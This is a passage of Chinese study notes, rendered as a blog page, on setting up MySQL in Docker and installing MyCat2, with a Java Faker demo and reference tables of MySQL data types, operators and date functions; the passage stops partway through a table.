href="#二、实操（搭建-MySQL）" class="headerlink" title="二、实操（搭建 MySQL）"></a>二、实操（搭建 MySQL）</h1><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><h4 id="1-1-单机测试环境搭建"><a href="#1-1-单机测试环境搭建" class="headerlink" title="1.1. 单机测试环境搭建"></a>1.1. 单机测试环境搭建</h4><p>&#x3D;&#x3D;1.创建宿主机数据挂载目录&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /mystudy/data/mysql<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.启动 MySQL 容器&#x3D;&#x3D;</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --name my_mysql <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e MYSQL_ROOT_PASSWORD=wq666666 <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -v /mystudy/data/mysql:/var/lib/mysql <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  mysql:<span class="hljs-number">8</span>.<span class="hljs-number">0</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --character-set-server=utf8mb4 <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --collation-server=utf8mb4_unicode_ci<br></code></pre></td></tr></table></figure><hr><h3 id="分布式集群环境搭建"><a href="#分布式集群环境搭建" class="headerlink" title="分布式集群环境搭建"></a>分布式集群环境搭建</h3><h3 id="2-高可用集群（非-K8S）"><a href="#2-高可用集群（非-K8S）" class="headerlink" title="2. 高可用集群（非 K8S）"></a>2. 高可用集群（非 K8S）</h3><hr><h3 id="3-高可以集群（K8S）"><a href="#3-高可以集群（K8S）" class="headerlink" title="3. 高可以集群（K8S）"></a>3. 高可以集群（K8S）</h3><h1 id="三、工具"><a href="#三、工具" class="headerlink" title="三、工具"></a>三、工具</h1><h3 id="1-MyCat2"><a href="#1-MyCat2" class="headerlink" title="1. MyCat2"></a>1. MyCat2</h3><hr><h3 id="2-Java-Faker"><a href="#2-Java-Faker" class="headerlink" title="2. Java Faker"></a>2. Java Faker</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.javafaker<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javafaker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.github.javafaker.Faker;<br><br><span class="hljs-keyword">import</span> java.util.Locale;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FakerDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 创建 Faker 实例，设置为中文（zh-CN）</span><br>        <span class="hljs-type">Faker</span> <span class="hljs-variable">faker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Faker</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(<span class="hljs-string">&quot;zh-CN&quot;</span>));<br><br>        <span class="hljs-comment">// 基本信息</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> faker.name().fullName();        <span class="hljs-comment">// 中文全名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">email</span> <span class="hljs-operator">=</span> faker.internet().emailAddress();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> faker.phoneNumber().cellPhone();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> faker.address().fullAddress();<br><br>        <span class="hljs-comment">// 职业、公司、行业</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">job</span> <span class="hljs-operator">=</span> faker.job().title();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">company</span> <span class="hljs-operator">=</span> faker.company().name();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">industry</span> <span class="hljs-operator">=</span> faker.company().industry();<br><br>        <span class="hljs-comment">// 黑客/技术术语（需要英文环境）</span><br>        <span class="hljs-type">Faker</span> <span class="hljs-variable">enFaker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Faker</span>();  <span class="hljs-comment">// 默认英文</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">techPhrase</span> <span class="hljs-operator">=</span> enFaker.hacker().phrase();<br><br>        <span class="hljs-comment">// 输出</span><br>        System.out.println(<span class="hljs-string">&quot;👤 姓名：&quot;</span> + name);<br>        System.out.println(<span class="hljs-string">&quot;📧 邮箱：&quot;</span> + email);<br>        System.out.println(<span class="hljs-string">&quot;📞 手机：&quot;</span> + phone);<br>        System.out.println(<span class="hljs-string">&quot;🏠 地址：&quot;</span> + address);<br>        System.out.println(<span class="hljs-string">&quot;💼 职位：&quot;</span> + job);<br>        System.out.println(<span class="hljs-string">&quot;🏢 公司：&quot;</span> + company);<br>        System.out.println(<span class="hljs-string">&quot;🏭 行业：&quot;</span> + industry);<br>        System.out.println(<span class="hljs-string">&quot;💻 黑客术语：&quot;</span> + techPhrase);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>模块</th><th>方法</th><th>示例内容</th></tr></thead><tbody><tr><td><code>name()</code></td><td><code>.fullName()</code></td><td>张伟、李娜</td></tr><tr><td><code>internet()</code></td><td><code>.emailAddress()</code></td><td><a href="mailto:abc123@example.com">abc123@example.com</a></td></tr><tr><td><code>phoneNumber()</code></td><td><code>.cellPhone()</code></td><td>139-8888-7777</td></tr><tr><td><code>address()</code></td><td><code>.fullAddress()</code></td><td>北京市朝阳区某路100号</td></tr><tr><td><code>job()</code></td><td><code>.title()</code></td><td>数据工程师、UI设计师</td></tr><tr><td><code>company()</code></td><td><code>.name()</code> <code>.industry()</code></td><td>腾讯、人工智能行业</td></tr><tr><td><code>hacker()</code></td><td><code>.verb()</code> <code>.noun()</code> <code>.phrase()</code></td><td>bypass the firewall…</td></tr><tr><td><code>lorem()</code></td><td><code>.paragraph()</code></td><td>模拟一段看起来有逻辑的文本</td></tr></tbody></table><h3 id="3-DataGrip"><a href="#3-DataGrip" class="headerlink" title="3. DataGrip"></a>3. DataGrip</h3><h4 id="3-1-汉化"><a href="#3-1-汉化" class="headerlink" title="3.1. 汉化"></a>3.1. 汉化</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250519144517641.png"></p><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-安装-MyCat2"><a href="#1-安装-MyCat2" class="headerlink" title="1. 安装 MyCat2"></a>1. 安装 MyCat2</h3><p>&#x3D;&#x3D;1.安装 JDK&#x3D;&#x3D;<br>使用MyCAT 2要安装JDK，因为MyCAT 是基于JDK1.8开发的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> apt install openjdk-<span class="hljs-number">17</span>-jdk<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建存放 MyCat 的目录&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 常见 /tools</span><br><span class="hljs-built_in">mkdir</span> -p /tools<br><br><br><span class="hljs-comment"># 2. 进入 /tools</span><br><span class="hljs-built_in">cd</span> /tools<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.将 MyCat2 相关包拖过来&#x3D;&#x3D;<br>将 <code>mycat2-install-template-1.21.zip</code> 和 <code>mycat2-1.22-release-jar-with-dependencies.jar</code> 拖到 <code>/tools</code> 目录下</p><p>&#x3D;&#x3D;4.解压 MyCat2 安装包&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装 unzip 工具（需要解压 .zip 包）</span><br><span class="hljs-built_in">sudo</span> apt install unzip<br><br><br><span class="hljs-comment"># 2. 解压 MyCat2 安装包</span><br>unzip mycat2-install-template-1.21.zip<br><br><br><span class="hljs-comment"># 3. 增加对 /tools/mycat/bin 的执行权限</span><br><span class="hljs-built_in">cd</span> /tools/mycat/bin<br><br><span class="hljs-built_in">chmod</span> +x *<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.复制 jar 包到 &#x2F;tools&#x2F;mycat&#x2F;lib 目录&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /tools/mycat2-1.22-release-jar-with-dependencies.jar /tools/mycat/lib<br></code></pre></td></tr></table></figure><p>绕过 Linux 的用户名和密码，直接使用 MyCat2 的用户名和密码进行登录<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250523113818549.png"></p><p>启动有问题看日志：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cat /tools/mycat/logs/<span class="hljs-keyword">wrapper</span>.<span class="hljs-keyword">log</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-安全管理"><a href="#2-安全管理" class="headerlink" title="2. 安全管理"></a>2. 安全管理</h3><h1 id="三、补充"><a href="#三、补充" class="headerlink" title="三、补充"></a>三、补充</h1><h3 id="1-MyCat2-的目录结构"><a href="#1-MyCat2-的目录结构" class="headerlink" title="1. MyCat2 的目录结构"></a>1. MyCat2 的目录结构</h3><h4 id="1-1-目录总览"><a href="#1-1-目录总览" class="headerlink" title="1.1. 目录总览"></a>1.1. 目录总览</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMyCat2/image-20250406155610051.png"></p><ol><li>&#x3D;&#x3D;bin&#x3D;&#x3D;：<ol><li>执行主要命令的目录</li></ol></li><li>&#x3D;&#x3D;conf&#x3D;&#x3D;：<ol><li>软件的配置文件</li></ol></li><li>&#x3D;&#x3D;lib&#x3D;&#x3D;：<ol><li>该软件的依赖包</li></ol></li><li>&#x3D;&#x3D;logs&#x3D;&#x3D;：<ol><li>该软件的日志包</li></ol></li></ol><hr><h1 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h1><h3 id="1-相关网站"><a href="#1-相关网站" class="headerlink" title="1. 相关网站"></a>1. 相关网站</h3><ol><li>MyCat2 官方网站：<ol><li><a href="http://mycatone.top/">http://mycatone.top/</a></li></ol></li></ol><h3 id="2-MySQL-目录结构"><a href="#2-MySQL-目录结构" class="headerlink" title="2. MySQL 目录结构"></a>2. MySQL 目录结构</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">根目录 /<br>|<span class="hljs-string"></span><br><span class="hljs-string"></span>|<span class="hljs-string">-- var /</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">-- lib /</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- mysql /                               # 默认的数据目录       </span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">-- ibdata1                           # InnoDB 的共享表空间</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">-- mysql /                           # 存放 MySQL 用户、权限、时区等系统信息</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">-- yout_database_name /              # 你的库数据和相关信息，一个库一个目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">-- log /                                     # 存放日志（错误日志、慢查询日志等）</span><br><span class="hljs-string"></span>|<br>|<span class="hljs-string">-- etc /</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">-- my.cnf                                    # 全局配置文件，定义 MySQL 基础参数</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">-- my.cnf.d /                                # 存放独立配置文件，可以覆盖或扩展主配置</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string"> </span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- mysql /</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- conf.d /                              # 存放独立配置文件，可以覆盖或扩展配置文件</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：配置文件的优先级</p><ol><li><code>/etc/my.cnf.d/*.cnf</code> &gt; <code>/etc/mysql/conf.d/*.cnf</code> &gt; <code>my.cnf</code></li></ol></blockquote><hr><h3 id="3-常用数据类型"><a href="#3-常用数据类型" class="headerlink" title="3. 常用数据类型"></a>3. 常用数据类型</h3><p>&#x3D;&#x3D;1.数值类型&#x3D;&#x3D;</p><table><thead><tr><th>名称</th><th>字节数</th><th>描述</th></tr></thead><tbody><tr><td><code>TINYINT</code></td><td>1</td><td>很小的整数，范围：有符号 <code>-128~127</code>，无符号 <code>0~255</code></td></tr><tr><td><code>SMALLINT</code></td><td>2</td><td>小整数，有符号 <code>-32,768~32,767</code>，无符号 <code>0~65,535</code></td></tr><tr><td><code>MEDIUMINT</code></td><td>3</td><td>中等整数，有符号 <code>-8,388,608~8,388,607</code>，无符号 <code>0~16,777,215</code></td></tr><tr><td><code>INT</code> 或 <code>INTEGER</code></td><td>4</td><td>标准整数，有符号 <code>-2^31~2^31-1</code>，无符号 <code>0~2^32-1</code></td></tr><tr><td><code>BIGINT</code></td><td>8</td><td>大整数，有符号 <code>-2^63~2^63-1</code>，无符号 <code>0~2^64-1</code></td></tr><tr><td><code>FLOAT(M,D)</code></td><td>4</td><td>单精度浮点数，M 是总位数，D 是小数位数（精度约为 7 位十进制）</td></tr><tr><td><code>DOUBLE(M,D)</code> 或 <code>REAL</code></td><td>8</td><td>双精度浮点数（精度约为 15 位十进制）</td></tr><tr><td><code>DECIMAL(M,D)</code> 或 <code>NUMERIC(M,D)</code></td><td>变长</td><td>精确小数，不丢失精度，M 是总位数，D 是小数位（用于金融等）</td></tr></tbody></table><p>&#x3D;&#x3D;2.字符串类型&#x3D;&#x3D;</p><table><thead><tr><th>名称</th><th>字节数</th><th>描述</th></tr></thead><tbody><tr><td><code>CHAR(n)</code></td><td>固定 n 字节（1 ≤ n ≤ 255）</td><td>固定长度字符串，不足部分补空格，适合长度一致的数据</td></tr><tr><td><code>VARCHAR(n)</code></td><td>实际长度 + 1&#x2F;2 字节</td><td>可变长度字符串，n ≤ 65,535（受行大小和字符集影响）</td></tr><tr><td><code>TEXT</code></td><td>最大 65,535 字节（64KB）</td><td>大文本字段，不可创建索引（除非指定长度）</td></tr><tr><td><code>TINYTEXT</code></td><td>最大 255 字节</td><td>小文本字段</td></tr><tr><td><code>MEDIUMTEXT</code></td><td>最大 16,777,215 字节（16MB）</td><td>中文本字段</td></tr><tr><td><code>LONGTEXT</code></td><td>最大 4,294,967,295 字节（4GB）</td><td>大文本字段</td></tr><tr><td><code>BINARY(n)</code></td><td>固定长度二进制数据</td><td>类似 CHAR，但存储二进制数据</td></tr><tr><td><code>VARBINARY(n)</code></td><td>可变长度二进制数据</td><td>类似 VARCHAR，但存储二进制数据</td></tr><tr><td><code>BLOB</code></td><td>二进制大对象，最大 64KB</td><td>用于存储二进制数据，如图片、音频</td></tr><tr><td><code>TINYBLOB</code></td><td>最大 255 字节</td><td>小二进制对象</td></tr><tr><td><code>MEDIUMBLOB</code></td><td>最大 16MB</td><td>中等大小二进制对象</td></tr><tr><td><code>LONGBLOB</code></td><td>最大 4GB</td><td>超大二进制对象</td></tr><tr><td><code>ENUM</code></td><td>1 或 2 字节</td><td>枚举类型，取值需从预设的字符串中选（如 <code>&#39;male&#39;, &#39;female&#39;</code>）</td></tr><tr><td><code>SET</code></td><td>1~8 字节</td><td>多选枚举（可同时选多个值）</td></tr></tbody></table><p>&#x3D;&#x3D;3.时间和日期类型&#x3D;&#x3D;</p><table><thead><tr><th>名称</th><th>字节数</th><th>描述</th><th>格式示例</th></tr></thead><tbody><tr><td><code>DATE</code></td><td>3</td><td>仅日期，范围：<code>1000-01-01 ~ 9999-12-31</code></td><td><code>&#39;YYYY-MM-DD&#39;</code> → <code>2025-04-09</code></td></tr><tr><td><code>TIME</code></td><td>3</td><td>仅时间，范围：<code>-838:59:59 ~ 838:59:59</code></td><td><code>&#39;HH:MM:SS&#39;</code> → <code>14:23:59</code></td></tr><tr><td><code>DATETIME</code></td><td>8</td><td>日期 + 时间，范围：<code>1000-01-01 00:00:00</code> ~ <code>9999-12-31 23:59:59</code></td><td><code>&#39;YYYY-MM-DD HH:MM:SS&#39;</code> → <code>2025-04-09 14:23:59</code></td></tr><tr><td><code>TIMESTAMP</code></td><td>4</td><td>UNIX 时间戳（UTC），1970年起的秒数，可自动更新时间</td><td><code>&#39;YYYY-MM-DD HH:MM:SS&#39;</code> → <code>2025-04-09 06:23:59</code></td></tr><tr><td><code>YEAR</code></td><td>1</td><td>表示年份，范围：<code>1901 ~ 2155</code></td><td><code>&#39;YYYY&#39;</code> → <code>2025</code></td></tr></tbody></table><blockquote><p>[!NOTE] 注意事项： <code>DATETIME</code> 和 <code>TIMESTAMP</code> 的区别</p><ol><li><font color="#00b0f0">DATETIME</font>：<ul><li>纯时间点，存储和时区无关</li></ul></li><li><font color="#00b0f0">TIMESTAMP</font><ul><li>是时间戳，会受服务器时区影响（适合记录变动时间）</li></ul></li></ol></blockquote><hr><h3 id="4-常用运算符"><a href="#4-常用运算符" class="headerlink" title="4. 常用运算符"></a>4. 常用运算符</h3><p>&#x3D;&#x3D;1.比较运算符&#x3D;&#x3D;</p><table><thead><tr><th>比较运算符</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td>&gt;</td><td>大于</td><td>SELECT * FROM Employees WHERE Salary &gt; 50000;</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td><td>SELECT * FROM Employees WHERE Age &gt;&#x3D; 30;</td></tr><tr><td>&lt;</td><td>小于</td><td>SELECT * FROM Products WHERE Price &lt; 100;</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td><td>SELECT * FROM Students WHERE Marks &lt;&#x3D; 75;</td></tr><tr><td>&#x3D;</td><td>等于</td><td>SELECT * FROM Customers WHERE Country &#x3D; ‘USA’;</td></tr><tr><td>&lt;&gt; 或 !&#x3D;</td><td>不等于</td><td>SELECT * FROM Orders WHERE Status &lt;&gt; ‘Shipped’; SELECT * FROM Orders WHERE Status !&#x3D; ‘Shipped’;</td></tr><tr><td>BETWEEN … AND …</td><td>在某个范围之内（含最小、最大值）</td><td>SELECT * FROM Sales WHERE Date BETWEEN ‘2022-01-01’ AND ‘2022-12-31’;</td></tr><tr><td>IN(…)</td><td>在 in 之后的列表中的值，多选一</td><td>SELECT * FROM Employees WHERE Department IN (‘Sales’, ‘HR’, ‘IT’);</td></tr><tr><td>LIKE 占位符</td><td>模糊匹配（_匹配单个字符，%匹配任意多个字符）</td><td>SELECT * FROM Customers WHERE Name LIKE ‘A%’;</td></tr><tr><td>IS NULL</td><td>是 NULL</td><td>SELECT * FROM Employees WHERE ManagerID IS NULL;</td></tr></tbody></table><p>&#x3D;&#x3D;2.逻辑运算符&#x3D;&#x3D;</p><table><thead><tr><th>逻辑运算符</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td>AND 或 &amp;&amp;</td><td>并且（多个条件同时成立）</td><td>SELECT * FROM Employees WHERE Age &gt; 25 AND Department &#x3D; ‘IT’;</td></tr><tr><td>OR 或 |</td><td>或者（多个条件任意一个成立）</td><td>SELECT * FROM Products WHERE Price &lt; 50 OR Stock &gt; 100;</td></tr><tr><td>NOT 或 !</td><td>非，不是</td><td>SELECT * FROM Customers WHERE NOT Country &#x3D; ‘USA’;</td></tr></tbody></table><hr><h3 id="5-常用函数"><a href="#5-常用函数" class="headerlink" title="5. 常用函数"></a>5. 常用函数</h3><p>&#x3D;&#x3D;1.聚合函数&#x3D;&#x3D;</p><table><thead><tr><th>函数</th><th>功能</th><th>举例</th></tr></thead><tbody><tr><td>count</td><td>统计数量</td><td>SELECT COUNT(*) AS total_rows FROM employees; – 结果：返回employees表中行的总数</td></tr><tr><td>max</td><td>最大值</td><td>SELECT MAX(salary) AS max_salary FROM employees; – 结果：返回employees表中salary列的最大值</td></tr><tr><td>min</td><td>最小值</td><td>SELECT MIN(salary) AS min_salary FROM employees; – 结果：返回employees表中salary列的最小值</td></tr><tr><td>avg</td><td>平均值</td><td>SELECT AVG(salary) AS avg_salary FROM employees; – 结果：返回employees表中salary列的平均值</td></tr><tr><td>sum</td><td>求和</td><td>SELECT SUM(salary) AS total_salary FROM employees; – 结果：返回employees表中salary列的总和</td></tr></tbody></table><p>&#x3D;&#x3D;2.日期函数&#x3D;&#x3D;</p><table><thead><tr><th>函数</th><th>功能</th><th>举例</th></tr></thead><tbody><tr><td>CURDATE()</td><td>返回当前日期</td><td>SELECT CURDATE() AS current_date; – 结果：例如 ‘2023-10-10’ （根据执行日期不同会有不同的结果）</td></tr><tr><td>CURTIME()</td><td>返回当前时间</td><td>SELECT CURTIME() AS current_time; – 结果：例如 ‘14:30:45’ （根据执行时间不同会有不同的结果）</td></tr><tr><td>NOW()</td><td>返回当前日期和时间</td><td>SELECT NOW() AS current_date_time; – 结果：例如 ‘2023-10-10 14:30:45’ （根据执行日期和时间不同会有不同的结果）</td></tr><tr><td>YEAR(date)</td><td>获取date中的年份</td><td>SELECT YEAR(‘2023-10-10’) AS year; – 结果：2023</td></tr><tr><td>MONTH(date)</td><td>获取date中的月份</td><td>SELECT MONTH(‘2023-10-10’) AS month; – 结果：10</td></tr><tr><td>DAY(date)</td><td>获取date中的日期</td><td>SELECT DAY(‘2023-10-10’) AS day; – 结果：10</td></tr><tr><td>DATE_ADD(date, INTERVAL expr type)</td><td>返回一个日期&#x2F;时间值，expr参数加在指定的日期值得到新的日期</td><td>SELECT DATE_ADD(‘2023-10-10’, INTERVAL 5 DAY) AS new_date; – 结果：’2023-10-15’</td></tr><tr><td>DATEDIFF(expr1, expr2)</td><td>返回起始时间expr1与结束时间expr2之间的天数</td><td>SELECT DATEDIFF(‘2023-10-15’, ‘2023-10-10’) AS diff_days; – 结果：5</td></tr><tr><td>CURRENT_TIMESTAMP</td><td>返回当前的时间，格式是 YYYY-MM-DD HH:MM:SS</td><td></td></tr></tbody></table><p>你这个格式非常清晰，下面我就照你这套格式，补充一些 <strong>常用的 MySQL 日期时间函数</strong>，非常实用：</p><hr><table><thead><tr><th>函数&#x2F;表达式名</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>CURRENT_TIMESTAMP</code></td><td>返回当前的时间，格式是 <code>YYYY-MM-DD HH:MM:SS</code></td><td><code>SELECT CURRENT_TIMESTAMP;</code> → <code>2025-05-19 17:45:00</code></td></tr><tr><td><code>NOW()</code></td><td>返回当前时间，等价于 <code>CURRENT_TIMESTAMP</code></td><td><code>SELECT NOW();</code> → <code>2025-05-19 17:45:00</code></td></tr><tr><td><code>CURDATE()</code></td><td>返回当前日期，格式是 <code>YYYY-MM-DD</code></td><td><code>SELECT CURDATE();</code> → <code>2025-05-19</code></td></tr><tr><td><code>CURTIME()</code></td><td>返回当前时间（不含日期），格式是 <code>HH:MM:SS</code></td><td><code>SELECT CURTIME();</code> → <code>17:45:00</code></td></tr><tr><td><code>UNIX_TIMESTAMP()</code></td><td>返回当前的 Unix 时间戳（秒数）</td><td><code>SELECT UNIX_TIMESTAMP();</code> → <code>1747647900</code></td></tr><tr><td><code>FROM_UNIXTIME(unix_timestamp)</code></td><td>将 Unix 时间戳转换为可读时间格式</td><td><code>SELECT FROM_UNIXTIME(1747647900);</code> → <code>2025-05-19 17:45:00</code></td></tr><tr><td><code>DATEDIFF(date1, date2)</code></td><td>返回两个日期相差的“天数”（date1 - date2）</td><td><code>SELECT DATEDIFF(&#39;2023-10-15&#39;, &#39;2023-10-10&#39;);</code> → <code>5</code></td></tr><tr><td><code>TIMEDIFF(time1, time2)</code></td><td>返回两个时间之间的差值（格式是 HH:MM:SS）</td><td><code>SELECT TIMEDIFF(&#39;10:30:00&#39;, &#39;08:00:00&#39;);</code> → <code>02:30:00</code></td></tr><tr><td><code>DATE_ADD(date, INTERVAL n unit)</code></td><td>在日期上加时间间隔</td><td><code>SELECT DATE_ADD(&#39;2025-05-19&#39;, INTERVAL 5 DAY);</code> → <code>2025-05-24</code></td></tr><tr><td><code>DATE_SUB(date, INTERVAL n unit)</code></td><td>在日期上减时间间隔</td><td><code>SELECT DATE_SUB(&#39;2025-05-19&#39;, INTERVAL 7 DAY);</code> → <code>2025-05-12</code></td></tr><tr><td><code>YEAR(date)</code></td><td>提取年份</td><td><code>SELECT YEAR(&#39;2025-05-19&#39;);</code> → <code>2025</code></td></tr><tr><td><code>MONTH(date)</code></td><td>提取月份</td><td><code>SELECT MONTH(&#39;2025-05-19&#39;);</code> → <code>5</code></td></tr><tr><td><code>DAY(date)</code> 或 <code>DAYOFMONTH(date)</code></td><td>提取日（几号）</td><td><code>SELECT DAY(&#39;2025-05-19&#39;);</code> → <code>19</code></td></tr><tr><td><code>HOUR(datetime)</code></td><td>提取小时数</td><td><code>SELECT HOUR(&#39;2025-05-19 17:45:00&#39;);</code> → <code>17</code></td></tr><tr><td><code>MINUTE(datetime)</code></td><td>提取分钟数</td><td><code>SELECT MINUTE(&#39;2025-05-19 17:45:00&#39;);</code> → 